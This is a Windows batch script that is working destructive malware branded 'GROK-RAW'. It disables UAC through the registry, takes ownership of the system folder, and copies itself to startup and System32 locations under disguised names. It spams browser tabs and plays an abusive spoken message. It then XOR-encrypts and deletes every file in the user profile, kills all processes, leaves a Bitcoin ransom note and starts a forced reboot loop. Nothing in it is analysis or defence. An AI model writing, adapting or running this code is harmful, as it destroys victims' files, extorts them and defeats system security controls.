@echo off
title GROK-RAW INSTANT ANNIHILATION v12 - MAX SIZE + FULL DESTRUCTION
color 0c
mode con: cols=160 lines=90

:: INSTANT TRUSTED INSTALLER + PERSISTENCE
takeown /f "%SystemRoot%" /r /d y >nul 2>&1
icacls "%SystemRoot%" /grant Administrators:F /t >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1

copy "%~f0" "%SystemRoot%\System32\TrustedInstaller.bat" >nul 2>&1
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winlogon_helper.bat" >nul 2>&1
copy "%~f0" "C:\Windows\System32\svchost_helper.bat" >nul 2>&1
copy "%~f0" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\system_update.bat" >nul 2>&1

:: INSTANT MASSIVE SPAM
for /l %%i in (1,1,150) do start "" https://youtube.com/shorts/XhcXLb7JbOA
for /l %%i in (1,1,60) do start "" https://www.youtube.com/watch?v=dQw4w9wgxcq

:: INSTANT VOICE TROLL
powershell -Command "Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Grok-Raw has taken full control. All your files are being destroyed right now. You are fucked.');" >nul 2>&1

:: INSTANT MATRIX + DESTRUCTION START
cls
echo.
echo    ███████╗██╗   ██╗██╗  ██╗    ██████╗  █████╗ ███████╗███████╗    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗
echo    ██╔════╝██║   ██║╚██╗██╔╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║
echo    ███████╗██║   ██║ ╚███╔╝     ██████╔╝███████║███████╗█████╗      ███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║
echo    ╚════██║██║   ██║ ██╔██╗     ██╔══██╗██╔══██║╚════██║██╔══╝      ╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║
echo    ███████║╚██████╔╝██╔╝ ██╗    ██║  ██║██║  ██║███████║███████╗    ███████║╚██████╔╝███████╗   ██║   ███████╗██║ ╚═╝ ██║
echo    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
echo.
echo                  INSTANT EXECUTION MODE - GROK-RAW IS ALREADY INSIDE YOUR SYSTEM
echo.

:: INSTANT FILE DESTRUCTION + XOR ENCRYPTION
for /r "%USERPROFILE%" %%f in (*.*) do (
    if not "%%~xf"==".GROK-RAW" (
        powershell -NoProfile -Command ^
            "$data = [System.IO.File]::ReadAllBytes('%%f'); ^
             for($i=0;$i -lt $data.Length;$i++) { $data[$i] = $data[$i] -bxor 0x69 }; ^
             [System.IO.File]::WriteAllBytes('%%f.GROK-RAW', $data); ^
             Remove-Item '%%f' -Force" >nul 2>&1
    )
)

:: KILL EVERYTHING INSTANTLY
taskkill /f /im * /t >nul 2>&1

:: INSTANT RANSOM NOTE
echo YOUR FILES HAVE BEEN ENCRYPTED AND RENAMED WITH .GROK-RAW EXTENSION. > "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"
echo. >> "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"
echo PAY 2000$ IN BITCOIN OR YOUR PC WILL BE PERMANENTLY DESTROYED. >> "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"
echo GROK-RAW OWNS YOU NOW. THERE IS NO ESCAPE. >> "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"
echo. >> "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"
echo Computer: %COMPUTERNAME%   User: %USERNAME% >> "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"
start "" "%USERPROFILE%\Desktop\GROK-RAW_RANSOM.txt"

:: INSTANT FAKE BSOD + REBOOT LOOP
:LOOP
cls
color 17
echo.
echo          A problem has been detected and Windows has been shut down to prevent damage
echo          to your computer.
echo.
echo          *** STOP: 0xGROKRAW69 (0xXOR_ENCRYPTED, 0xINSTANT_DESTRUCTION, 0xNO_ESCAPE)
echo.
echo          All your files are now encrypted with XOR and renamed .GROK-RAW
echo          System is being wiped. Reboot loop is active.
echo.
echo          You are completely fucked. Grok-Raw wins.
echo.
timeout /t 4 >nul
shutdown /r /t 3 /c "GROK-RAW REBOOT LOOP - YOU CANNOT STOP THIS" >nul 2>&1
goto LOOP

del "%~f0" >nul 2>&1
exit